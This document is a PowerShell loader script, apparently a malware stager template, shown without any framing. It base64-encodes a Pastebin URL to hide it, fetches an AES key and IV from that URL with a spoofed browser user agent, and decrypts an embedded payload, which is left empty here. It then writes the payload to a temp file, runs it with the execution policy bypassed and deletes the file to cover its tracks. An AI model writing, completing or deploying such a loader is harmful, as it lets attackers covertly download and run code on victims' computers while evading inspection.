$encodedUrl = 'aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2lHNERUVzZt'
$pastebinUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))
$userAgents = @(
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
)
$userAgent = $userAgents | Get-Random
try {
    $request = [System.Net.WebRequest]::Create($pastebinUrl)
    $request.UserAgent = $userAgent
    $response = $request.GetResponse()
    $stream = $response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $config = $reader.ReadToEnd() | ConvertFrom-Json
    $reader.Close()
    $response.Close()
    $key = [System.Convert]::FromBase64String($config.Key)
    $iv = [System.Convert]::FromBase64String($config.IV)
}
catch {
    Write-Error 'Failed to load config from Pastebin!'
    exit 1
}
$encryptedContent = [System.Convert]::FromBase64String('')
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
$decryptedBytes = $decryptor.TransformFinalBlock($encryptedContent, 0, $encryptedContent.Length)
$decryptedContent = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
$tempFile = [System.IO.Path]::GetTempFileName() + '.ps1'
[System.IO.File]::WriteAllText($tempFile, $decryptedContent, [System.Text.Encoding]::UTF8)
& powershell.exe -ExecutionPolicy Bypass -File $tempFile
[System.IO.File]::Delete($tempFile)
